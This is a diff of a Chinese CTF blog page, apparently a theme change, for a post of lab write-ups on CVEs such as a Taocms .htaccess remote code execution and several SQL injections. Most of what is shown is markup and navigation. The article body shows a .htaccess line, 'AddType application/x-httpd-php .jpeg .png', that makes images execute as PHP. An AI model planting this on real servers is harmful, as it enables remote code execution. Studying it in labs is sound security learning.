@@ -1,18 +1,51 @@
 <!DOCTYPE html>
-<html lang=en>
+<html lang="zh-CN">
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="CVE-2022-25578#RCE CVE-2022-25578是Taocms v3.0.2中存在的一个安全漏洞，该漏洞允许攻击者通过任意编辑.htaccess文件来执行代码注入攻击。 TaocmstaoCMS是一个完善支持多数据库(Sqlite&#x2F;Mysql)的CMS网站内容管理系统，是国内最小的功能完善 的基于php+SQLite&#x2F;Mysql的CMS。体积小（仅180Kb）">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script>
+  (function () {
+    var OriginTitle = document.title;
+    var titleTime;
+    document.addEventListener('visibilitychange', function () {
+      if (document.hidden) {
+        document.title = '坏人！看完了就想走' + OriginTitle;
+        clearTimeout(titleTime);
+      } else {
+        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
+        titleTime = setTimeout(function () {
+          document.title = OriginTitle;
+        }, 2000);
+      }
+    });
+  })();
+</script>
+
+    <meta name="description" content="这篇文章持续更新一些常用的CVE吧...">
 <meta property="og:type" content="article">
 <meta property="og:title" content="春秋CVE刷题学习">
 <meta property="og:url" content="https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="root@wanth3f1ag">
-<meta property="og:description" content="CVE-2022-25578#RCE CVE-2022-25578是Taocms v3.0.2中存在的一个安全漏洞，该漏洞允许攻击者通过任意编辑.htaccess文件来执行代码注入攻击。 TaocmstaoCMS是一个完善支持多数据库(Sqlite&#x2F;Mysql)的CMS网站内容管理系统，是国内最小的功能完善 的基于php+SQLite&#x2F;Mysql的CMS。体积小（仅180Kb）">
-<meta property="og:locale" content="en_US">
+<meta property="og:description" content="这篇文章持续更新一些常用的CVE吧...">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250206000349335.png">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250206000451437.png">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250206000929016.png">
@@ -30,166 +63,277 @@
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250219204730280.png">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250219211027136.png">
 <meta property="article:published_time" content="2025-02-05T15:59:30.000Z">
-<meta property="article:modified_time" content="2025-11-06T10:38:51.893Z">
+<meta property="article:modified_time" content="2025-12-01T11:31:41.592Z">
 <meta property="article:author" content="wanTh3flag">
 <meta property="article:tag" content="cve">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250206000349335.png">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>春秋CVE刷题学习</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
 
 
-    <!-- Umami Analytics -->
+<link rel="canonical" href="https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/">
 
 
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/","path":"2025/02/05/春秋CVE刷题学习/","title":"春秋CVE刷题学习"}</script>
 
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-
-<meta name="generator" content="Hexo 7.3.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">H0me</a></li><!--
-     --><!--
-       --><li><a href="/about/">A6out</a></li><!--
-     --><!--
-       --><li><a href="/tags/">T6gs</a></li><!--
-     --><!--
-       --><li><a href="/categories/">Catagory</a></li><!--
-     --><!--
-       --><li><a href="/links/">L1nks</a></li><!--
-     --><!--
-       --><li><a href="/search/">s4arch</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="Previous post" href="/2025/02/07/SSRF%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="Next post" href="/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&text=春秋CVE刷题学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&title=春秋CVE刷题学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&is_video=false&description=春秋CVE刷题学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=春秋CVE刷题学习&body=Check out this article: https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&title=春秋CVE刷题学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&title=春秋CVE刷题学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&title=春秋CVE刷题学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&title=春秋CVE刷题学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&name=春秋CVE刷题学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&t=春秋CVE刷题学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-25578"><span class="toc-number">1.</span> <span class="toc-text">CVE-2022-25578</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">1.1.</span> <span class="toc-text">#RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Taocms"><span class="toc-number">1.2.</span> <span class="toc-text">Taocms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">.htaccess文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess-%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4"><span class="toc-number">1.4.</span> <span class="toc-text">.htaccess 常见指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-32991"><span class="toc-number">2.</span> <span class="toc-text">CVE-2022-32991</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">#SQL注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-28512"><span class="toc-number">3.</span> <span class="toc-text">CVE-2022-28512</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">#SQL联合注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-28060"><span class="toc-number">4.</span> <span class="toc-text">CVE-2022-28060</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.</span> <span class="toc-text">#SQL注入读取文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-36104"><span class="toc-number">5.</span> <span class="toc-text">CVE-2024-36104</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">5.1.</span> <span class="toc-text">#目录遍历</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-11043"><span class="toc-number">6.</span> <span class="toc-text">CVE-2019-11043</span></a></li></ol>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        春秋CVE刷题学习
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">wanTh3flag</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2025-02-05T15:59:30.000Z" class="dt-published" itemprop="datePublished">2025-02-05</time>
-        
-        (Updated: <time datetime="2025-11-06T10:38:51.893Z" class="dt-updated" itemprop="dateModified">2025-11-06</time>)
-        
-      
-    </div>
-
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a>
-    </div>
-
-
-      
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/cve/" rel="tag">cve</a>
-    </div>
-
-
-    </div>
-  </header>
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>春秋CVE刷题学习 | root@wanth3f1ag</title>
   
 
-  <div class="content e-content" itemprop="articleBody">
-    <h2 id="CVE-2022-25578"><a href="#CVE-2022-25578" class="headerlink" title="CVE-2022-25578"></a>CVE-2022-25578</h2><h3 id="RCE"><a href="#RCE" class="headerlink" title="#RCE"></a>#RCE</h3><p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250206000349335.png" alt="image-20250206000349335"></p>
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">root@wanth3f1ag</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTFer</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-25578"><span class="nav-number">1.</span> <span class="nav-text">CVE-2022-25578</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE"><span class="nav-number">1.1.</span> <span class="nav-text">#RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Taocms"><span class="nav-number">1.2.</span> <span class="nav-text">Taocms</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#htaccess%E6%96%87%E4%BB%B6"><span class="nav-number">1.3.</span> <span class="nav-text">.htaccess文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#htaccess-%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4"><span class="nav-number">1.4.</span> <span class="nav-text">.htaccess 常见指令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-32991"><span class="nav-number">2.</span> <span class="nav-text">CVE-2022-32991</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.</span> <span class="nav-text">#SQL注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-28512"><span class="nav-number">3.</span> <span class="nav-text">CVE-2022-28512</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">3.1.</span> <span class="nav-text">#SQL联合注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-28060"><span class="nav-number">4.</span> <span class="nav-text">CVE-2022-28060</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">4.1.</span> <span class="nav-text">#SQL注入读取文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2024-36104"><span class="nav-number">5.</span> <span class="nav-text">CVE-2024-36104</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">5.1.</span> <span class="nav-text">#目录遍历</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2019-11043"><span class="nav-number">6.</span> <span class="nav-text">CVE-2019-11043</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wanTh3flag</p>
+  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">160</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">117</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="wanTh3flag">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="root@wanth3f1ag">
+      <meta itemprop="description" content="一条有梦想的咸鱼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="春秋CVE刷题学习 | root@wanth3f1ag">
+      <meta itemprop="description" content="这篇文章持续更新一些常用的CVE吧...">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          春秋CVE刷题学习
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-02-05 23:59:30" itemprop="dateCreated datePublished" datetime="2025-02-05T23:59:30+08:00">2025-02-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-12-01 19:31:41" itemprop="dateModified" datetime="2025-12-01T19:31:41+08:00">2025-12-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" itemprop="url" rel="index"><span itemprop="name">春秋云镜</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4.9k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">这篇文章持续更新一些常用的CVE吧...</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="CVE-2022-25578"><a href="#CVE-2022-25578" class="headerlink" title="CVE-2022-25578"></a>CVE-2022-25578</h2><h3 id="RCE"><a href="#RCE" class="headerlink" title="#RCE"></a>#RCE</h3><p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250206000349335.png" alt="image-20250206000349335"></p>
 <p>CVE-2022-25578是Taocms v3.0.2中存在的一个安全漏洞，该漏洞允许攻击者通过任意编辑.htaccess文件来执行代码注入攻击。</p>
 <h3 id="Taocms"><a href="#Taocms" class="headerlink" title="Taocms"></a>Taocms</h3><p>taoCMS是一个完善支持多数据库(Sqlite&#x2F;Mysql)的CMS网站内容管理系统，是国内最小的功能完善 的基于php+SQLite&#x2F;Mysql的CMS。体积小（仅180Kb）速度快，包含文件管理、数据采集、Memcache整 合、用户管理等强大功能，跨平台运行，支持SAE、BAE云服务。兼容PHP5和PHP7.代码手写采用严格的数据过滤，保证 服务器的安全稳定！</p>
 <p>打开靶机</p>
@@ -202,7 +346,7 @@
 <p>作用范围：</p>
 <p>.htaccess 文件中的配置指令作用于 .htaccess 文件所在的<strong>目录及其所有子目录</strong>，但是很重要的、需要注意的是，其上级目录也可能会有 .htaccess 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的 .htaccess 文件中的指令可能会覆盖其上级目录中的 .htaccess 文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。</p>
 <h3 id="htaccess-常见指令"><a href="#htaccess-常见指令" class="headerlink" title=".htaccess 常见指令"></a>.htaccess 常见指令</h3><p><strong>AddType 指令</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpeg .png</span><br></pre></td></tr></table></figure>
